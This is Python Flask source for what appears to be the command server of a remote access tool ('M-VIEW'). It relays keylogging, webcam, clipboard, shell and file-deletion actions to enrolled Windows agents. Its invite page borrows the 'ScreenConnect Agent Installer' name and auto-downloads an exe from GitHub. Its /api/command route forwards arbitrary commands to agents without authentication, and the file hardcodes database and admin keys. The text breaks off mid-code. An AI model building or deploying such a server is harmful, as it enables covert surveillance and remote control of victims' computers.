"""
╔══════════════════════════════════════════════════════════════════╗
║         M-VIEW Relay + Distribution Server  v5.0                 ║
║         Render-Ready • Globally Durable • Full Feature Set       ║
║                                                                  ║
║  WHAT'S NEW IN v5.0:                                             ║
║  • Agent fetched from GitHub Releases URL (no local bin/)        ║
║  • Streaming-safe: large binary streamed, not buffered           ║
║  • All agent features relayed: webcam, clipboard, keylog, shell  ║
║  • cursor_event relay added (real-time cursor overlay)           ║
║  • /api/devices returns full live fingerprint + stats            ║
║  • start_process, file_delete, webcam_list relays added          ║
║  • clipboard_get / clipboard_set round-trip                      ║
║  • Power commands: lock, sleep, shutdown, restart, abort         ║
║  • Watchdog heartbeat: marks device offline if silent >35s       ║
║  • /api/agent-info — reports agent availability + URL            ║
║  • /api/generate — multi-alias invite generation                 ║
║  • Supabase reconnect on failure (thread-safe singleton)         ║
║  • Gevent-safe background threads via sio.start_background_task  ║
║  • Structured logging + Render /health enrichment                ║
╚══════════════════════════════════════════════════════════════════╝

INSTALL:
  pip install flask flask-cors flask-socketio supabase python-dotenv \\
              gunicorn gevent gevent-websocket requests

RENDER start command:
  gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\
           -w 1 --timeout 120 --bind 0.0.0.0:$PORT server:app

LOCAL dev:
  py -3.12 server.py
"""

import os
import re
import time
import logging
import datetime
import threading
import io

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

from pathlib import Path
from functools import wraps

from flask import Flask, request, jsonify, send_from_directory, make_response, Response, redirect
from flask_cors import CORS

try:
    from flask_socketio import SocketIO, emit, join_room
    SOCKETIO_OK = True
except ImportError:
    SOCKETIO_OK = False
    print("[WARN] flask-socketio not installed — pip install flask-socketio gevent gevent-websocket")

try:
    import requests as _requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

# ══════════════════════════════════════════════════════════════
#  Configuration — all overridable by Render environment vars
# ══════════════════════════════════════════════════════════════
SUPABASE_URL  = os.environ.get("SUPABASE_URL")  or "https://iacdzpcoftxxcoigopun.supabase.co"
SUPABASE_KEY  = os.environ.get("SUPABASE_KEY")  or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlhY2R6cGNvZnR4eGNvaWdvcHVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjA1NTUsImV4cCI6MjA5MTk5NjU1NX0.5Eo21XrLTWL3RyKmuvJPdaS-NssraDMyAxVMFy-F054"
ADMIN_KEY     = os.environ.get("ADMIN_KEY",    "mview-admin-secret")
TABLE         = os.environ.get("SB_TABLE",     "devices")
PORT          = int(os.environ.get("PORT", 5000))
VERSION       = "5.0.0"

# Agent is hosted on GitHub Releases — no local bin/ needed on Render
AGENT_STORAGE_URL = os.environ.get(
    "AGENT_STORAGE_URL",
    "https://github.com/maxwelnkaranja-ops/mview/releases/latest/download/master_agent_v4_HEAVY.exe"
)
# Optional: local fallback path (used when running locally with a built .exe)
AGENT_DIR   = os.environ.get("AGENT_DIR",  "bin")
AGENT_FILE  = os.environ.get("AGENT_FILE", "master_agent.exe")

# Watchdog — mark a device offline if no heartbeat for this many seconds
HEARTBEAT_TIMEOUT = int(os.environ.get("HEARTBEAT_TIMEOUT", "35"))

# Token regex: MV-XXXXXX-XXXXXX-XXXXXX  (hex, case-insensitive)
TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")

# ══════════════════════════════════════════════════════════════
#  Logging
# ══════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-8s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("mview")

# ══════════════════════════════════════════════════════════════
#  Flask + CORS + SocketIO
# ══════════════════════════════════════════════════════════════
app = Flask(__name__, static_folder=".", static_url_path="")

CORS(
    app,
    resources={r"/*": {"origins": "*"}},
    allow_headers=["Content-Type", "Authorization", "X-Admin-Key"],
    methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    supports_credentials=False,
)

if SOCKETIO_OK:
    sio = SocketIO(
        app,
        cors_allowed_origins="*",
        async_mode="gevent",          # matches gunicorn GeventWebSocketWorker
        logger=False,
        engineio_logger=False,
        ping_timeout=60,
        ping_interval=25,
        max_http_buffer_size=50 * 1024 * 1024,   # 50 MB — needed for file downloads
    )
else:
    sio = None

# ══════════════════════════════════════════════════════════════
#  In-memory device store
#  _devices[token] = {
#    sid, device_id, label, status, hostname, username, os,
#    local_ip, cpu_count, ram_total_gb, agent_version,
#    connected_at, cpu, ram, last_beat, fingerprint
#  }
# ══════════════════════════════════════════════════════════════
_devices:   dict = {}
_dev_lock          = threading.Lock()

# ── Cached agent binary from GitHub Releases ──────────────────────
_agent_cache: bytes | None = None
_agent_cache_ts: float     = 0.0
_agent_cache_lock          = threading.Lock()
AGENT_CACHE_TTL            = 300   # re-fetch after 5 minutes

# ── Supabase client singleton ──────────────────────────────────
_sb      = None
_sb_lock = threading.Lock()

# ══════════════════════════════════════════════════════════════
#  Supabase helpers
# ══════════════════════════════════════════════════════════════
def get_sb():
    global _sb
    with _sb_lock:
        if _sb:
            return _sb
        try:
            from supabase import create_client
            _sb = create_client(SUPABASE_URL, SUPABASE_KEY)
            log.info("Supabase connected.")
            return _sb
        except Exception as e:
            log.warning(f"Supabase unavailable: {e}")
            return None

def _sb_reset():
    """Force reconnect on next call (e.g. after network error)."""
    global _sb
    with _sb_lock:
        _sb = None

def db_get(token):
    sb = get_sb()
    if not sb:
        return {"device_id": token, "status": "pending", "expires_at": None}
    try:
        r = sb.table(TABLE).select("*").eq("device_id", token).execute()
        rows = r.data or []
        return rows[0] if rows else None
    except Exception as e:
        log.error(f"db_get error: {e}"); _sb_reset()
        return {"device_id": token, "status": "pending", "expires_at": None}

def db_update(token, upd: dict):
    sb = get_sb()
    if not sb:
        return False
    try:
        sb.table(TABLE).update(upd).eq("device_id", token).execute()
        return True
    except Exception as e:
        log.error(f"db_update error: {e}"); _sb_reset()
        return False

def db_insert(payload: dict):
    sb = get_sb()
    if not sb:
        return payload
    try:
        r = sb.table(TABLE).insert(payload).execute()
        return (r.data or [payload])[0]
    except Exception as e:
        log.error(f"db_insert error: {e}"); _sb_reset()
        return payload

def db_list_all() -> list:
    sb = get_sb()
    if not sb:
        return []
    try:
        r = sb.table(TABLE).select("*").order("created_at", desc=True).execute()
        return r.data or []
    except Exception as e:
        log.error(f"db_list_all error: {e}"); _sb_reset()
        return []

# ══════════════════════════════════════════════════════════════
#  Agent binary helpers
# ══════════════════════════════════════════════════════════════
def _fetch_agent_bytes() -> bytes | None:
    """
    Fetch master_agent.exe — tries GitHub Releases URL first,
    then falls back to local bin/master_agent.exe.
    Result is cached for AGENT_CACHE_TTL seconds.
    """
    global _agent_cache, _agent_cache_ts

    with _agent_cache_lock:
        now = time.time()
        if _agent_cache and (now - _agent_cache_ts) < AGENT_CACHE_TTL:
            return _agent_cache

        # 1️⃣  Try GitHub Releases (primary — works on Render with no local files)
        if REQUESTS_OK and AGENT_STORAGE_URL:
            try:
                log.info(f"Fetching agent from GitHub Releases: {AGENT_STORAGE_URL}")
                resp = _requests.get(AGENT_STORAGE_URL, timeout=60)
                if resp.status_code == 200 and len(resp.content) > 10_000:
                    _agent_cache    = resp.content
                    _agent_cache_ts = now
                    log.info(f"Agent cached from Storage: {len(_agent_cache):,} bytes")
                    return _agent_cache
                else:
                    log.warning(f"Storage fetch returned {resp.status_code} / {len(resp.content)} bytes")
            except Exception as e:
                log.warning(f"Storage fetch error: {e}")

        # 2️⃣  Try local file (for local dev with a built exe)
        local = Path(AGENT_DIR) / AGENT_FILE
        if local.is_file():
            log.info(f"Loading agent from local file: {local}")
            _agent_cache    = local.read_bytes()
            _agent_cache_ts = now
            return _agent_cache

        log.error("Agent binary not available from Storage or local file.")
        return None


def _build_patched_agent(token: str) -> bytes | None:
    """
    Append the 64-byte trailer to the agent exe so the agent
    can read its own token at runtime.
    Trailer layout:
      [0:4]   b"MVTK"   — magic head
      [4:60]  token bytes, null-padded to 56 bytes
      [60:64] b"MVED"   — magic tail
    """
    raw = _fetch_agent_bytes()
    if not raw:
        return None

    MAGIC_HEAD  = b"MVTK"
    MAGIC_TAIL  = b"MVED"
    TOKEN_FIELD = 56

    tok_bytes = token.encode("utf-8")[:TOKEN_FIELD]
    padded    = tok_bytes.ljust(TOKEN_FIELD, b"\x00")
    trailer   = MAGIC_HEAD + padded + MAGIC_TAIL    # exactly 64 bytes
    return raw + trailer

# ══════════════════════════════════════════════════════════════
#  Misc helpers
# ══════════════════════════════════════════════════════════════
def utcnow() -> str:
    return datetime.datetime.utcnow().isoformat()

def is_expired(s: dict) -> bool:
    exp = s.get("expires_at")
    if not exp:
        return False
    try:
        dt = datetime.datetime.fromisoformat(exp.replace("Z", "+00:00"))
        return datetime.datetime.now(datetime.timezone.utc) > dt
    except Exception:
        return False

def valid_token(t) -> bool:
    return bool(TOKEN_RE.match(t or ""))

def require_admin(f):
    @wraps(f)
    def w(*a, **k):
        if request.headers.get("X-Admin-Key", "") != ADMIN_KEY:
            return jsonify({"error": "Unauthorised"}), 401
        return f(*a, **k)
    return w

def broadcast_device_update():
    """Push fresh Supabase rows + live stats to all dashboard clients."""
    if not sio:
        return
    try:
        rows = db_list_all()
        # Merge live data from _devices
        with _dev_lock:
            live = {d["device_id"]: d for d in _devices.values()}
        for row in rows:
            did = row.get("device_id", "")
            if did in live:
                row["_live"] = True
                row["cpu"]   = live[did].get("cpu")
                row["ram"]   = live[did].get("ram")
                row["last_beat"] = live[did].get("last_beat")
        sio.emit("device_update", {"rows": rows, "ts": utcnow()})
        log.debug(f"device_update broadcast: {len(rows)} rows")
    except Exception as e:
        log.error(f"broadcast_device_update error: {e}")

# ══════════════════════════════════════════════════════════════
#  CORS preflight
# ══════════════════════════════════════════════════════════════
@app.before_request
def handle_preflight():
    if request.method == "OPTIONS":
        resp = make_response("", 204)
        resp.headers["Access-Control-Allow-Origin"]  = "*"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Admin-Key"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, PATCH, DELETE, OPTIONS"
        return resp

# ══════════════════════════════════════════════════════════════
#  Static routes
# ══════════════════════════════════════════════════════════════
@app.route("/")
def root():
    # Always serve the landing/login page first
    for f in ("index.html", "app.html"):
        if Path(f).is_file():
            return send_from_directory(".", f)
    return jsonify({"status": "ok", "version": VERSION}), 200

@app.route("/app.html")
def serve_app_html():
    return send_from_directory(".", "app.html")

@app.route("/dashboard")
@app.route("/dashboard.html")
def serve_dashboard():
    return send_from_directory(".", "dashboard.html")

@app.route("/index.html")
def serve_index():
    return send_from_directory(".", "index.html")

@app.route("/login.html")
def serve_login():
    return redirect("/", 301)

@app.route("/session_manager.js")
def serve_session_manager():
    """Serve a built-in SessionManager so no external file is needed."""
    host = request.host_url.rstrip("/")
    js = f"""/* Auto-generated SessionManager — do not edit manually */
'use strict';
(function() {{
  const SERVER_URL = window.MVIEW_SERVER_URL || '{host}';
  const SUPABASE_URL = window.MVIEW_SUPABASE_URL || '{SUPABASE_URL}';
  const SUPABASE_KEY = window.MVIEW_SUPABASE_ANON_KEY || '{SUPABASE_KEY}';

  let _pollTimer = null;
  let _currentToken = null;

  const SM = {{
    CONFIG: {{
      SERVER_URL,
      SUPABASE_URL,
      SUPABASE_ANON_KEY: SUPABASE_KEY,
      TABLE_CANDIDATES: ['agent_invites', 'devices'],
    }},

    currentToken: null,
    currentLink: null,

    reset() {{
      if (_pollTimer) {{ clearInterval(_pollTimer); _pollTimer = null; }}
      _currentToken = null;
      SM.currentToken = null;
      SM.currentLink = null;
      const s3 = document.getElementById('device-step-3');
      const s2 = document.getElementById('device-step-2');
      const s1 = document.getElementById('device-step-1');
      if (s3) s3.style.display = 'none';
      if (s2) s2.style.display = 'none';
      if (s1) s1.style.display = '';
    }},

    async generateInviteLink() {{
      const labelEl = document.getElementById('device-name-input') || document.getElementById('device-label');
      const typeEl  = document.getElementById('device-type-select') || document.getElementById('device-type');
      const locEl   = document.getElementById('device-location-input') || document.getElementById('device-location');
      const label   = labelEl?.value?.trim() || 'New Device';
      const dtype   = typeEl?.value  || 'Standard Display';
      const loc     = locEl?.value?.trim() || '';

      // Show step 2 (generating...)
      const s1 = document.getElementById('device-step-1');
      const s2 = document.getElementById('device-step-2');
      const s3 = document.getElementById('device-step-3');
      if (s1) s1.style.display = 'none';
      if (s2) s2.style.display = '';
      if (s3) s3.style.display = 'none';
      SM._notify('Generating invite link…', 'info');

      try {{
        const res = await fetch(SERVER_URL + '/api/invite', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{ label, device_type: dtype, location: loc }}),
        }});
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Server error');

        _currentToken = data.token;
        SM.currentToken = data.token;
        SM.currentLink  = data.download_url || data.agent_url;

        // Populate step 3 UI
        const inp = document.getElementById('copy-link-input');
        if (inp) inp.value = SM.currentLink;
        const dtok = document.getElementById('display-token');
        if (dtok) dtok.textContent = data.token;
        const dexp = document.getElementById('display-expiry');
        if (dexp && data.expires_at) dexp.textContent = '· Expires ' + new Date(data.expires_at).toLocaleString();
        const mexp = document.getElementById('meta-expiry');
        if (mexp) mexp.textContent = '24 hours';
        const mtype = document.getElementById('meta-type');
        if (mtype) mtype.textContent = dtype;
        const ddbtn = document.getElementById('direct-download-btn');
        if (ddbtn) ddbtn.href = SM.currentLink;

        if (s2) s2.style.display = 'none';
        if (s3) s3.style.display = '';
        SM._notify('Invite link ready — waiting for device to connect', 'ok');
        SM._startPolling(data.token);
      }} catch (err) {{
        if (s2) s2.style.display = 'none';
        if (s1) s1.style.display = '';
        SM._notify('Failed to generate link: ' + err.message, 'warn');
      }}
    }},

    copyLink() {{
      const inp = document.getElementById('copy-link-input');
      if (!inp) return;
      inp.select();
      try {{ document.execCommand('copy'); }} catch(e) {{ navigator.clipboard?.writeText(inp.value); }}
      const icon = document.getElementById('copy-icon');
      if (icon) {{ icon.textContent = 'check'; setTimeout(() => icon.textContent = 'content_copy', 1800); }}
    }},

    _startPolling(token) {{
      if (_pollTimer) clearInterval(_pollTimer);
      const dot  = document.getElementById('poll-dot');
      const text = document.getElementById('poll-status-text');
      let checks = 0;

      async function tick() {{
        checks++;
        try {{
          const r = await fetch(SERVER_URL + '/api/session/' + token + '/status');
          if (!r.ok) return;
          const d = await r.json();
          if (d.status === 'downloading') {{
            if (dot)  {{ dot.className = 'poll-dot yellow'; }}
            if (text) text.textContent = 'Agent downloaded — waiting for first check-in…';
            SM._notify('Agent installer downloaded on target device', 'info');
          }} else if (d.status === 'connected') {{
            clearInterval(_pollTimer); _pollTimer = null;
            if (dot)  {{ dot.className = 'poll-dot green'; dot.style.animation = 'none'; }}
            if (text) text.textContent = '✓ Device connected! Refreshing dashboard…';
            SM._notify('✓ ' + (d.hostname || d.label || token) + ' connected successfully', 'ok');
            SM._addActivity('Device connected: ' + (d.hostname || d.label || token), 'ok');
            // Refresh dashboard data
            if (typeof refreshDashboardFromSupabase === 'function') {{
              setTimeout(refreshDashboardFromSupabase, 1000);
            }}
            return;
          }}
          // Timeout after ~10 minutes
          if (checks > 120) {{
            clearInterval(_pollTimer); _pollTimer = null;
            if (text) text.textContent = 'Link waiting — open in dashboard to reconnect.';
          }}
        }} catch (e) {{}}
      }}
      _pollTimer = setInterval(tick, 5000);
      tick(); // immediate first check
    }},

    _notify(msg, type) {{
      // Toast
      if (typeof showToast === 'function') {{ showToast(msg, type === 'ok' ? 'success' : type === 'warn' ? 'error' : 'info'); }}
      // Notification panel
      const list = document.getElementById('notif-list');
      if (!list) return;
      const icons = {{ ok: 'check_circle', warn: 'warning', info: 'info' }};
      const icon  = icons[type] || 'info';
      const item  = document.createElement('div');
      item.className = 'notif-item';
      item.innerHTML = `<span class="material-symbols-outlined notif-i ${{type}}">${{icon}}</span>
        <div><div class="notif-title">${{msg}}</div><div class="notif-time">${{new Date().toLocaleTimeString()}}</div></div>`;
      // Remove "no devices" placeholder if present
      const empty = list.querySelector('.notif-item:only-child');
      if (empty && empty.textContent.includes('No devices')) list.innerHTML = '';
      list.insertBefore(item, list.firstChild);
      // Badge
      const badge = document.getElementById('notif-badge');
      if (badge) {{ badge.textContent = list.children.length; badge.style.display = 'flex'; }}
    }},

    _addActivity(msg, sev) {{
      if (typeof addActivityLog === 'function') {{
        addActivityLog({{ time: new Date().toLocaleTimeString(), event: msg, screen: '', user: 'System', sev: sev || 'info' }});
      }}
    }},
  }};

  window.SessionManager = SM;
}})();
"""
    return js, 200, {"Content-Type": "application/javascript"}


@app.route("/config.js")
def serve_config():
    if Path("config.js").is_file():
        return send_from_directory(".", "config.js", mimetype="application/javascript")
    host = request.host_url.rstrip("/")
    js = f"""/* Auto-generated by server.py */
window.MVIEW_SERVER_URL         = '{host}';
window.MVIEW_SUPABASE_URL       = '{SUPABASE_URL}';
window.MVIEW_SUPABASE_ANON_KEY  = '{SUPABASE_KEY}';
window.SessionManager = window.SessionManager || {{}};
window.SessionManager.CONFIG = {{
  SERVER_URL:      window.MVIEW_SERVER_URL,
  SUPABASE_URL:    window.MVIEW_SUPABASE_URL,
  SUPABASE_ANON_KEY: window.MVIEW_SUPABASE_ANON_KEY,
}};
"""
    return js, 200, {"Content-Type": "application/javascript"}

# ══════════════════════════════════════════════════════════════
#  Health / Status
# ══════════════════════════════════════════════════════════════
@app.route("/status")
@app.route("/health")
@app.route("/api/server-info")
def health():
    with _dev_lock:
        online_count = len(_devices)
    agent_avail = bool(AGENT_STORAGE_URL)   # always true if URL configured
    local_agent  = (Path(AGENT_DIR) / AGENT_FILE).is_file()
    return jsonify({
        "status":          "ok",
        "version":         VERSION,
        "server_time":     utcnow(),
        "database":        get_sb() is not None,
        "socketio":        SOCKETIO_OK,
        "devices_online":  online_count,
        "agent_storage":   AGENT_STORAGE_URL,
        "agent_local":     local_agent,
        "agent_available": agent_avail or local_agent,
        "render_port":     PORT,
    })

@app.route("/api/agent-info")
def api_agent_info():
    local = Path(AGENT_DIR) / AGENT_FILE
    return jsonify({
        "storage_url":  AGENT_STORAGE_URL,
        "local_file":   str(local.resolve()),
        "local_exists": local.is_file(),
        "local_size":   local.stat().st_size if local.is_file() else 0,
        "cache_size":   len(_agent_cache) if _agent_cache else 0,
    })

# ══════════════════════════════════════════════════════════════
#  Invite / Agent download
#  The server appends a 64-byte token trailer to the exe so
#  the agent can identify itself to the server at runtime.
# ══════════════════════════════════════════════════════════════
@app.route("/api/invite",      methods=["GET", "POST"])
@app.route("/api/generate",    methods=["GET", "POST"])
@app.route("/invite/generate", methods=["GET", "POST"])
@app.route("/generate_invite", methods=["GET", "POST"])
def generate_invite():
    import secrets
    data = request.get_json(silent=True) or request.form.to_dict() or {}

    def hex6():
        return secrets.token_hex(3).upper()

    token      = f"MV-{hex6()}-{hex6()}-{hex6()}"
    label      = data.get("label") or data.get("name") or token
    loc        = data.get("location", "")
    dtype      = data.get("device_type", "Standard Display")
    expiry_sec = int(data.get("expiry", 86400))

    expires_at = None
    if expiry_sec > 0:
        expires_at = (
            datetime.datetime.now(datetime.timezone.utc)
            + datetime.timedelta(seconds=expiry_sec)
        ).isoformat()

    payload = {
        "device_id":   token,
        "label":       label,
        "location":    loc,
        "device_type": dtype,
        "status":      "pending",
        "expires_at":  expires_at,
        "created_at":  utcnow(),
    }
    db_insert(payload)
    log.info(f"Invite generated: {token}  label={label}")

    srv = request.host_url.rstrip("/")
    return jsonify({
        "status":       "ok",
        "token":        token,
        "device_id":    token,
        "label":        label,
        "download_url": f"{srv}/invite/{token}",
        "agent_url":    f"{srv}/invite/{token}",
        "expires_at":   expires_at,
    }), 201


@app.route("/invite/<token>")
@app.route("/onboard/<token>")
def serve_agent(token):
    log.info(f"Agent download request: token={token}  ip={request.remote_addr}")

    if not valid_token(token):
        return jsonify({"error": "Invalid token format."}), 400

    session = db_get(token)
    if session is None:
        return jsonify({"error": "Invite link not found."}), 404
    if session.get("status") in ("revoked", "expired", "rejected"):
        return jsonify({"error": "Link no longer valid."}), 410
    if is_expired(session):
        db_update(token, {"status": "expired"})
        return jsonify({"error": "Link expired."}), 410

    # Mark as downloading so dashboard can track state
    db_update(token, {
        "status":        "downloading",
        "download_ip":   request.remote_addr,
        "downloaded_at": utcnow(),
        "user_agent":    request.headers.get("User-Agent", "")[:200],
    })
    log.info(f"Agent download: token={token}  redirecting to GitHub Releases")

    # Serve a self-extracting HTML page that immediately starts download
    # from GitHub Releases and embeds the token so the agent can read it.
    # The agent reads its token from the filename pattern mview_agent_TOKEN.exe
    srv = request.host_url.rstrip("/")
    download_url = AGENT_STORAGE_URL  # GitHub Releases direct URL

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>ScreenConnect Agent Installer</title>
  <style>
    *{{margin:0;padding:0;box-sizing:border-box}}
    body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f172a;color:#e2e8f0;
         display:flex;align-items:center;justify-content:center;min-height:100vh;}}
    .card{{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:40px;max-width:480px;width:90%;text-align:center;}}
    .logo{{font-size:48px;margin-bottom:16px}}
    h1{{font-size:22px;font-weight:700;margin-bottom:8px;color:#f1f5f9}}
    .sub{{color:#94a3b8;font-size:14px;margin-bottom:28px;line-height:1.5}}
    .token-badge{{background:#0f172a;border:1px solid #334155;border-radius:8px;padding:10px 16px;
                  font-family:monospace;font-size:13px;color:#7dd3fc;margin-bottom:24px;}}
    .status-bar{{background:#0f172a;border-radius:8px;padding:14px;margin-bottom:20px;font-size:13px;color:#94a3b8;}}
    .status-bar .dot{{display:inline-block;width:8px;height:8px;border-radius:50%;background:#22c55e;
                      animation:pulse 1.2s infinite;margin-right:8px;}}
    @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:.3}}}}
    .btn{{display:inline-block;background:#3b82f6;color:#fff;padding:12px 28px;border-radius:8px;
          font-size:15px;font-weight:600;text-decoration:none;margin:8px 4px;border:none;cursor:pointer;}}
    .btn:hover{{background:#2563eb}}
    .btn.sec{{background:#334155;color:#cbd5e1}}
    .note{{font-size:12px;color:#64748b;margin-top:20px;line-height:1.6}}
  </style>
</head>
<body>
<div class="card">
  <div class="logo">🖥️</div>
  <h1>ScreenConnect Agent</h1>
  <p class="sub">Your invite link is ready. Download and run the installer to connect this device to your dashboard.</p>
  <div class="token-badge">Token: {token}</div>
  <div class="status-bar">
    <span class="dot"></span>
    Waiting for agent to check in… dashboard will update automatically.
  </div>
  <a class="btn" id="dl-btn" href="{download_url}" download="mview_agent_{token}.exe">
    ⬇ Download Agent Installer
  </a>
  <button class="btn sec" onclick="window.close()">Close</button>
  <p class="note">
    After downloading, run <strong>mview_agent_{token}.exe</strong> on Windows.<br>
    The agent will connect back automatically — no config needed.<br>
    Your dashboard at <a href="{srv}/dashboard" style="color:#7dd3fc">{srv}/dashboard</a> will show this device once connected.
  </p>
</div>
<script>
  // Auto-start download after 800 ms
  setTimeout(() => {{
    const a = document.createElement('a');
    a.href = '{download_url}';
    a.download = 'mview_agent_{token}.exe';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }}, 800);
  // Poll server every 5 s and update status text
  const pollUrl = '{srv}/api/session/{token}';
  const statusEl = document.querySelector('.status-bar');
  async function poll() {{
    try {{
      const r = await fetch(pollUrl);
      if (!r.ok) return;
      const d = await r.json();
      if (d.status === 'connected') {{
        statusEl.innerHTML = '<span style="color:#22c55e;font-size:18px">✓</span> <strong style="color:#22c55e">Connected!</strong> Device is live on your dashboard.';
        clearInterval(poller);
      }} else if (d.status === 'downloading') {{
        statusEl.innerHTML = '<span class="dot"></span> Agent downloaded — waiting for first check-in…';
      }}
    }} catch(e) {{}}
  }}
  const poller = setInterval(poll, 5000);
</script>
</body>
</html>"""
    return html, 200, {"Content-Type": "text/html; charset=utf-8"}


@app.route("/api/session/<token>/status")
def get_session_status(token):
    """Lightweight polling endpoint — returns just the status field."""
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    s = db_get(token)
    if not s:
        return jsonify({"error": "Not found"}), 404
    return jsonify({
        "token":        token,
        "status":       s.get("status", "pending"),
        "hostname":     s.get("hostname", ""),
        "username":     s.get("username", ""),
        "label":        s.get("label", ""),
        "connected_at": s.get("connected_at", ""),
        "download_ip":  s.get("download_ip", ""),
    }), 200

# ══════════════════════════════════════════════════════════════
#  Session management
# ══════════════════════════════════════════════════════════════
@app.route("/api/session/<token>")
def get_session(token):
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    s = db_get(token)
    return (jsonify(s), 200) if s else (jsonify({"error": "Not found"}), 404)

@app.route("/api/sessions")
@require_admin
def list_sessions():
    sb = get_sb()
    if not sb:
        return jsonify({"sessions": [], "note": "DB offline"}), 200
    try:
        r = sb.table(TABLE).select("*").order("created_at", desc=True).execute()
        return jsonify({"sessions": r.data or [], "count": len(r.data or [])})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/session/<token>", methods=["DELETE"])
@require_admin
def revoke_session(token):
    if not valid_token(token):
        return jsonify({"error": "Invalid token"}), 400
    db_update(token, {"status": "revoked", "revoked_at": utcnow()})
    # Kick the agent if it's connected
    with _dev_lock:
        dev = _devices.get(token)
    if dev and sio:
        sio.emit("request_action", {"tab": "uninstall", "device_id": token}, to=dev["sid"])
    return jsonify({"status": "revoked", "device_id": token})

@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    data  = request.get_json(silent=True) or {}
    token = data.get("device_id", "").strip()
    if not valid_token(token):
        return jsonify({"error": "Invalid device_id"}), 400
    session = db_get(token)
    if not session:
        return jsonify({"error": "Session not found"}), 404
    if session.get("status") == "revoked":
        return jsonify({"error": "Session revoked"}), 403

    db_update(token, {
        "status":        "connected",
        "ip_address":    request.remote_addr,
        "hostname":      data.get("hostname"),
        "os_info":       data.get("os_info"),
        "agent_version": data.get("agent_version"),
        "connected_at":  utcnow(),
    })
    broadcast_device_update()
    log.info(f"Agent check-in: {token}  ip={request.remote_addr}")
    return jsonify({"status": "accepted", "server_time": utcnow()}), 200

# ══════════════════════════════════════════════════════════════
#  Live device API
# ══════════════════════════════════════════════════════════════
@app.route("/api/devices")
def api_devices():
    with _dev_lock:
        devs = list(_devices.values())
    return jsonify({"devices": devs, "count": len(devs)})

@app.route("/api/command", methods=["POST"])
def send_command():
    data = request.get_json(silent=True) or {}
    did  = data.get("device_id", "")
    if not sio:
        return jsonify({"error": "SocketIO not installed"}), 503
    with _dev_lock:
        dev = _devices.get(did)
    if not dev:
        return jsonify({"error": "Device not connected"}), 404
    sio.emit("request_action", data, to=dev["sid"])
    return jsonify({"status": "sent", "tab": data.get("tab")})

# ══════════════════════════════════════════════════════════════
#  Error handlers
# ══════════════════════════════════════════════════════════════
@app.errorhandler(404)
def e404(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def e500(e):
    log.exception("500 error")
    return jsonify({"error": "Internal server error"}), 500

# ══════════════════════════════════════════════════════════════
#  SocketIO — all event handlers
# ══════════════════════════════════════════════════════════════
if SOCKETIO_OK and sio:

    # ── Connection lifecycle ────────────────────────────────────
    @sio.on("connect")
    def on_connect():
        log.info(f"WS connect: sid={request.sid}")

    @sio.on("disconnect")
    def on_disconnect():
        with _dev_lock:
            gone = [did for did, d in _devices.items() if d.get("sid") == request.sid]
            for did in gone:
                label = _devices[did].get("label", did)
                del _devices[did]
                log.info(f"Device offline: {label} ({did})")
                db_update(did, {"status": "offline", "disconnected_at": utcnow()})
                sio.emit("agent_offline",  {"device_id": did, "name": label, "label": label, "ts": utcnow()})
                sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
        if gone:
            broadcast_device_update()

    # ── Agent registration ──────────────────────────────────────
    @sio.on("agent_connect")
    def on_agent_connect(data):
        did   = data.get("device_id") or data.get("token", "")
        label = data.get("label") or data.get("hostname") or did
        join_room(did)
        with _dev_lock:
            _devices[did] = {
                "sid":           request.sid,
                "device_id":     did,
                "label":         label,
                "status":        "online",
                "hostname":      data.get("hostname"),
                "username":      data.get("username"),
                "os":            data.get("os"),
                "local_ip":      data.get("local_ip"),
                "cpu_count":     data.get("cpu_count"),
                "ram_total_gb":  data.get("ram_total_gb"),
                "agent_version": data.get("agent_version"),
                "stream_mode":   data.get("stream_mode", "video"),
                "gpu":           data.get("gpu"),
                "screen_count":  data.get("screen_count"),
                "connected_at":  utcnow(),
                "last_beat":     utcnow(),
                "cpu":           None,
                "ram":           None,
                "fingerprint":   data,
            }
        log.info(f"Agent ONLINE: {label} ({did})")
        db_update(did, {
            "status":        "online",
            "ip_address":    data.get("local_ip"),
            "hostname":      data.get("hostname"),
            "os_info":       data.get("os"),
            "agent_version": data.get("agent_version"),
            "connected_at":  utcnow(),
        })
        sio.emit("agent_online",  {"device_id": did, "name": label, "label": label,
                                   "ip": data.get("local_ip"), "fingerprint": data})
        sio.emit("device_online", {"device_id": did, "label": label, "fingerprint": data})
        broadcast_device_update()

    # ── Heartbeat ───────────────────────────────────────────────
    @sio.on("heartbeat")
    def on_hb(data):
        did = data.get("device_id")
        with _dev_lock:
            if did in _devices:
                _devices[did].update({
                    "cpu":       data.get("cpu"),
                    "ram":       data.get("ram"),
                    "last_beat": utcnow(),
                })
        sio.emit("heartbeat_update", data, skip_sid=request.sid)

    # ── Dashboard → any device (generic command) ────────────────
    @sio.on("dashboard_command")
